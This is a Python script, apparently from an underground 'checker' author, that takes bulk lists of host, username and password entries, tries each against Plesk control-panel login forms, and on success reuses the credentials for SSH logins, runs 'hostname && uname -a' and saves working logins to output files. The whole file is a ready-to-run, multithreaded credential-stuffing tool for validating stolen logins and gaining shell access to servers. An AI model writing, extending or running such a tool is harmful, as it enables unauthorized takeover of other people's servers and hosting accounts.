#!/usr/bin/env python3
"""
Plesk + SSH Auto Login Checker
- First checks Plesk login
- If Plesk login successful, automatically checks SSH login on same server
- Input format per line: <url_or_host[:port][/path]>[:]username[:]password
- Multithreaded, pause/resume with Ctrl+C
- Created by YamiFool - RoyalFool (Modified for Plesk+SSH)
"""

import argparse
import threading
import signal
import sys
import time
import socket
import paramiko
import warnings
import logging
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from colorama import init, Fore
import os
import re

# Nonaktifkan warning
warnings.filterwarnings('ignore')
logging.disable(logging.CRITICAL)
requests.packages.urllib3.disable_warnings()

init(autoreset=True)
pause_event = threading.Event()
pause_event.set()

# Configuration
DEFAULT_PLESK_PORT = 8443
DEFAULT_SSH_PORT = 22

# Common form field names for Plesk/web login
COMMON_FORM_FIELDS = [
    ("login_name", "passwd"),
    ("login", "passwd"),
    ("username", "password"),
    ("login", "password"),
    ("user", "pass"),
    ("login_name", "password")
]

# Failure keywords in response body
FAIL_KEYWORDS = [
    "incorrect", "invalid", "failed", "wrong username", "wrong password", "login is invalid",
    "authentication failed", "invalid login", "access denied"
]

# Success indicators in cookies
SUCCESS_COOKIE_KEYWORDS = ["PLESKSESSID", "psa_session", "pleskd", "PHPSESSID"]
SUCCESS_LOCATION_KEYWORDS = ["index", "session", "dashboard", "panel", "login_up.php"]


def print_banner():
    """Display banner with Royal watermark"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ██╗     ███████╗███████╗██╗  ██╗    ███████╗███████╗██╗  ██╗     ║
║    ██╔══██╗██║     ██╔════╝██╔════╝██║ ██╔╝    ██╔════╝██╔════╝██║  ██║     ║
║    ██████╔╝██║     █████╗  ███████╗█████╔╝     ███████╗███████╗███████║     ║
║    ██╔═══╝ ██║     ██╔══╝  ╚════██║██╔═██╗     ╚════██║╚════██║██╔══██║     ║
║    ██║     ███████╗███████╗███████║██║  ██╗    ███████║███████║██║  ██║     ║
║    ╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝     ║
║                                                                              ║
║                    🔥 PLESK + SSH CHECKER v1.0 🔥                           ║
║                                                                              ║
║                  Author: YamiFool - RoyalFool                               ║
║                 Based on Plesk Checker + RoyalSSH                          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}"""
    print(banner)


def watermark():
    """Return watermark string"""
    return f"{Fore.LIGHTBLACK_EX}[Royal-PleskSSH]{Fore.RESET} "


def parse_line(line: str):
    """Parse input line into (raw_url, username, password). Supports '|' or ':' separators."""
    if not line:
        return None
    s = line.strip()
    if not s or s.startswith("#"):
        return None

    if "|" in s:
        parts = s.split("|")
        if len(parts) >= 3:
            return parts[0].strip(), parts[1].strip(), parts[2].strip()
        return None

    if ":" in s:
        parts = s.rsplit(":", 2)
        if len(parts) == 3:
            return parts[0].strip(), parts[1].strip(), parts[2].strip()
        return None

    return None


def normalize_input_url(raw: str, default_port: int = DEFAULT_PLESK_PORT):
    """Normalize URL from input"""
    raw = raw.strip()
    if raw.startswith("//"):
        raw = "https:" + raw

    if not raw.startswith("http://") and not raw.startswith("https://"):
        tmp = "https://" + raw
    else:
        tmp = raw

    parsed = urlparse(tmp)
    scheme = parsed.scheme or "https"
    host = parsed.hostname
    path = parsed.path or ""
    port = parsed.port

    if not host:
        head = raw.split("/", 1)[0]
        if ":" in head:
            host_part, port_part = head.split(":", 1)
            host = host_part
            try:
                port = int(port_part)
            except Exception:
                port = None
        else:
            host = head
            port = None
        path = "/" + raw.split("/", 1)[1] if "/" in raw else ""

    base_no_port = f"{scheme}://{host}"
    if port:
        base_no_port = f"{scheme}://{host}:{port}"

    final_port = port if port else default_port
    base_with_port = f"{scheme}://{host}:{final_port}"

    if path in (None, "", "/"):
        path = None

    return base_no_port, path, base_with_port, host


def hostname_resolvable(host: str) -> bool:
    """Check if hostname resolves"""
    try:
        socket.gethostbyname(host)
        return True
    except Exception:
        return False


def try_plesk_login(session: requests.Session, login_url: str, user: str, pwd: str, timeout: int = 15):
    """Try Plesk login with multiple field combinations"""
    for uname_field, pwd_field in COMMON_FORM_FIELDS:
        data = {uname_field: user, pwd_field: pwd}
        try:
            resp = session.post(login_url, data=data, allow_redirects=False, timeout=timeout, verify=False)
        except requests.RequestException as e:
            return False, f"REQUEST_ERROR:{e}", None

        # Check redirects
        loc = resp.headers.get("Location", "") or resp.headers.get("location", "")
        if loc and any(k in loc.lower() for k in SUCCESS_LOCATION_KEYWORDS):
            return True, f"REDIRECT:{uname_field}/{pwd_field}", resp

        # Check cookies
        scookies = resp.headers.get("Set-Cookie", "") or resp.headers.get("set-cookie", "")
        if scookies:
            low = scookies.lower()
            for kw in SUCCESS_COOKIE_KEYWORDS:
                if kw.lower() in low:
                    return True, f"COOKIE:{uname_field}/{pwd_field}", resp

        # Check body
        body = (resp.text or "").lower()
        for fk in FAIL_KEYWORDS:
            if fk in body:
                last_fail_reason = f"BODY_FAIL({fk})"
                break
        else:
            if any(k in body for k in ["logout", "session", "logout.php", "my account", "panel", "dashboard"]):
                return True, f"BODY_SUCCESS:{uname_field}/{pwd_field}", resp

        if resp.status_code in (302, 303) and scookies:
            return True, f"REDIRECT_COOKIE:{uname_field}/{pwd_field}", resp

    return False, "ALL_FIELD_TRIED_FAIL", None


def ssh_login(host: str, port: int, username: str, password: str, timeout: int = 5):
    """Check SSH login"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    result = {
        'host': host,
        'port': port,
        'username': username,
        'password': password,
        'success': False,
        'banner': None,
        'hostname': None,
        'system': None,
        'error': None
    }
    
    try:
        # Get SSH banner
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        result['banner'] = banner[:100] if banner else "No banner"
        
        # Try login
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            auth_timeout=timeout
        )
        
        # Get system info
        stdin, stdout, stderr = client.exec_command('hostname && uname -a', timeout=5)
        output = stdout.read().decode('utf-8').strip().split('\n')
        
        result['success'] = True
        result['hostname'] = output[0] if output else host
        result['system'] = output[1] if len(output) > 1 else "Unknown"
        
    except paramiko.AuthenticationException:
        result['error'] = 'Auth Failed'
    except socket.timeout:
        result['error'] = 'Timeout'
    except socket.error as e:
        result['error'] = f'Socket: {str(e)[:30]}'
    except Exception as e:
        result['error'] = str(e)[:30]
    finally:
        client.close()
    
    return result


def worker(item, success_file, fail_file, timeout, debug):
    """Worker thread untuk cek Plesk + SSH"""
    raw_url, user, pwd = item
    base_no_port, path, base_with_port, host = normalize_input_url(raw_url)
    
    # Determine login endpoint for Plesk
    if path and path.lower().endswith(".php"):
        login_endpoint = base_no_port.rstrip("/") + path
    else:
        login_endpoint = base_no_port.rstrip("/") + "/login_up.php"
    
    if debug:
        print(f"{watermark()}{Fore.CYAN}[DEBUG] Host: {host}, Plesk URL: {login_endpoint}")
    
    # DNS Check
    if not hostname_resolvable(host):
        with threading.Lock():
            print(f"{watermark()}{Fore.YELLOW}[SKIP] {host} - DNS FAIL")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (DNS_FAIL)\n")
        return
    
    # STEP 1: Check Plesk Login
    session = requests.Session()
    plesk_ok, plesk_reason, plesk_resp = try_plesk_login(session, login_endpoint, user, pwd, timeout=timeout)
    
    if not plesk_ok:
        # Try fallback with default port
        fallback_login = base_with_port.rstrip("/") + "/login_up.php"
        if debug:
            print(f"{watermark()}{Fore.CYAN}[DEBUG] Trying fallback: {fallback_login}")
        plesk_ok2, plesk_reason2, _ = try_plesk_login(session, fallback_login, user, pwd, timeout=timeout)
        if plesk_ok2:
            plesk_ok, plesk_reason = plesk_ok2, plesk_reason2
    
    if not plesk_ok:
        with threading.Lock():
            print(f"{watermark()}{Fore.RED}[PLESK FAIL] {host} | {user} -> {plesk_reason}")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_FAIL: {plesk_reason})\n")
        return
    
    # STEP 2: If Plesk success, check SSH
    print(f"{watermark()}{Fore.GREEN}[PLESK OK] {host} | {user} -> {plesk_reason}")
    print(f"{watermark()}{Fore.CYAN}[SSH] Checking SSH on {host}:{DEFAULT_SSH_PORT}...")
    
    ssh_result = ssh_login(host, DEFAULT_SSH_PORT, user, pwd, timeout=timeout)
    
    with threading.Lock():
        if ssh_result['success']:
            print(f"{watermark()}{Fore.GREEN}[SSH OK] {host} | {user}:{pwd}")
            print(f"{watermark()}    ├─ Hostname: {ssh_result.get('hostname', 'N/A')}")
            print(f"{watermark()}    ├─ System: {ssh_result.get('system', 'N/A')[:50]}")
            print(f"{watermark()}    └─ Banner: {ssh_result.get('banner', 'N/A')}")
            
            # Save both Plesk and SSH success
            with open(success_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_OK)\n")
            
            # Save SSH-only success file
            with open("ssh_success.txt", "a", encoding="utf-8") as fh:
                fh.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
                fh.write(f"Host: {host}:{DEFAULT_SSH_PORT}\n")
                fh.write(f"Login: {user}:{pwd}\n")
                fh.write(f"Hostname: {ssh_result.get('hostname', 'N/A')}\n")
                fh.write(f"System: {ssh_result.get('system', 'N/A')}\n")
                fh.write(f"{'─'*40}\n")
        else:
            print(f"{watermark()}{Fore.RED}[SSH FAIL] {host} | {user} -> {ssh_result['error']}")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_FAIL: {ssh_result['error']})\n")
            
            # Still save Plesk-only success
            with open("plesk_only_success.txt", "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_FAIL: {ssh_result['error']})\n")


def handle_ctrl_c(signum, frame):
    """Handle Ctrl+C for pause/resume"""
    pause_event.clear()
    print(f"\n{watermark()}{Fore.YELLOW}CTRL+C detected. Paused.")
    while True:
        choice = input(f"{watermark()}{Fore.CYAN}[e]xit or [r]esume? ").strip().lower()
        if choice == "e":
            print(f"{watermark()}{Fore.RED}Exiting...")
            sys.exit(0)
        if choice == "r":
            pause_event.set()
            print(f"{watermark()}{Fore.GREEN}Resuming...")
            break
        print(f"{watermark()}{Fore.YELLOW}Invalid. Enter 'e' or 'r'.")


def choose_sep(s: str):
    """Choose separator"""
    if s == "|" or s.lower() == "pipe":
        return "|"
    if s == ":" or s.lower() == "colon":
        return ":"
    return s


def create_example_file():
    """Create example input file"""
    example = """# Plesk+SSH Credentials File
# Format: URL:username:password or URL|username|password
# Created for Plesk + SSH Checker

# Example with IP
http://192.168.1.1:8443:admin:password123

# Example with domain
https://plesk.example.com:8443|admin|secretpass

# Example with custom path
http://server.com/plesk/login.php:root:MyP@ssw0rd

# Example without port (will use default 8443 for Plesk)
https://plesk-server.com:admin:admin123
"""
    filename = "plesk_ssh_credentials.txt"
    with open(filename, "w") as f:
        f.write(example)
    print(f"{watermark()}{Fore.GREEN}Example file created: {filename}")
    print(f"{watermark()}{Fore.YELLOW}Edit this file with your credentials!")


def main():
    parser = argparse.ArgumentParser(description="Plesk + SSH Checker - Auto login validator")
    parser.add_argument("--file", "-f", help="Input file with credentials")
    parser.add_argument("--threads", "-t", type=int, default=10, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=12, help="HTTP/SSH timeout in seconds")
    parser.add_argument("--out", "-o", default=None, help="Output file for successes")
    parser.add_argument("--fail", "-F", default=None, help="Output file for fails")
    parser.add_argument("--out-sep", default="|", help="Output separator")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--example", action="store_true", help="Create example input file")
    args = parser.parse_args()

    if args.example:
        create_example_file()
        return

    if not args.file:
        parser.print_help()
        print(f"\n{watermark()}{Fore.RED}Error: --file is required!")
        return

    infile = args.file
    workers = max(1, args.threads)
    timeout = args.timeout
    out_sep = choose_sep(args.out_sep)
    success_file = args.out or f"{os.path.splitext(infile)[0]}_success.txt"
    fail_file = args.fail or f"{os.path.splitext(infile)[0]}_failed.txt"
    debug = args.debug

    # Prepare output files
    open(success_file, "w", encoding="utf-8").close()
    open(fail_file, "w", encoding="utf-8").close()
    open("ssh_success.txt", "a", encoding="utf-8").close()
    open("plesk_only_success.txt", "a", encoding="utf-8").close()

    try:
        with open(infile, "r", encoding="utf-8") as fh:
            lines = [ln.rstrip("\n") for ln in fh if ln.strip()]
    except FileNotFoundError:
        print(f"{watermark()}{Fore.RED}Input file not found: {infile}")
        sys.exit(1)

    entries = []
    for ln in lines:
        parsed = parse_line(ln)
        if not parsed:
            print(f"{watermark()}{Fore.YELLOW}[SKIP] Invalid format: {ln}")
            continue
        entries.append(parsed)

    print_banner()
    print(f"{watermark()}{Fore.YELLOW}[•] Loaded {len(entries)} entries from {infile}")
    print(f"{watermark()}{Fore.YELLOW}[•] Success file: {success_file}")
    print(f"{watermark()}{Fore.YELLOW}[•] Fail file: {fail_file}")
    print(f"{watermark()}{Fore.YELLOW}[•] SSH success: ssh_success.txt")
    print(f"{watermark()}{Fore.YELLOW}[•] Plesk-only: plesk_only_success.txt")
    print(f"{watermark()}{Fore.YELLOW}[•] Threads: {workers}")
    print(f"{watermark()}{Fore.YELLOW}[•] Timeout: {timeout}s")
    print()

    signal.signal(signal.SIGINT, handle_ctrl_c)

    start_time = time.time()
    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker, item, success_file, fail_file, timeout, debug) for item in entries]
        
        try:
            for future in as_completed(futures):
                while not pause_event.is_set():
                    time.sleep(0.1)
                # Count results (simplified)
                pass
        except KeyboardInterrupt:
            pass

    elapsed = time.time() - start_time
    
    # Print summary
    print(f"\n{watermark()}{Fore.CYAN}{'═'*60}")
    print(f"{watermark()}{Fore.YELLOW}SUMMARY REPORT")
    print(f"{watermark()}{Fore.CYAN}{'─'*60}")
    print(f"{watermark()}Time elapsed: {elapsed:.2f} seconds")
    print(f"{watermark()}Check completed!")
    print(f"{watermark()}{Fore.CYAN}{'═'*60}")
    print(f"{watermark()}{Fore.YELLOW}Check output files for detailed results:")
    print(f"{watermark()}  • {success_file} (Plesk+SSH success)")
    print(f"{watermark()}  • ssh_success.txt (SSH only)")
    print(f"{watermark()}  • plesk_only_success.txt (Plesk only)")
    print(f"{watermark()}{Fore.CYAN}{'═'*60}\n")


if __name__ == "__main__":
    main()
